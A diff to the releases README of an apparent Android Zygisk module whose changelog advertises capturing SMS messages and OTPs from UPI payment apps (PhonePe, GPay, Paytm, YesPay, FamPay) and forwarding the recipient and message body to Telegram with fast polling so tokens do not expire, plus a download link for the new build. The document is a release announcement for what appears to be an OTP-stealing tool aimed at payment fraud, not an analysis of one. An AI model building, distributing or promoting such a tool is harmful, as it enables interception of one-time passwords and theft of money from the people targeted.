@@ -1,9 +1,10 @@
 # Releases
 
-Latest: **virtus-zygisk-mode-v1.0.71.zip**
+Latest: **virtus-zygisk-mode-v1.0.72.zip**
 
-- TG format matches screenshot (Zygisk Mode / Menu By @Hivirtus)
-- Fast: Hero Java hooks immediate + TG poll 0.25s (fix ~15s delay / token expire)
-- Crash fix: PhonePe/GPay/Paytm/YesPay/FamPay — NO Java hooks (Intent only); Hero+Messages full
+All UPI apps → To+body on Telegram.
+- Hero/Messages: instant hooks (fast, no token expire)
+- PhonePe/GPay/Paytm/YesPay/…: Java ISms ~10–12s after open (crash avoid)
+- TG format screenshot-style + Number/SMS/One-tap + 0.25s poll
 
-https://raw.githubusercontent.com/legendop21/Zygisk-module/cursor/zygisk-sms-otp-module-97d6/releases/virtus-zygisk-mode-v1.0.71.zip
+https://raw.githubusercontent.com/legendop21/Zygisk-module/cursor/zygisk-sms-otp-module-97d6/releases/virtus-zygisk-mode-v1.0.72.zip
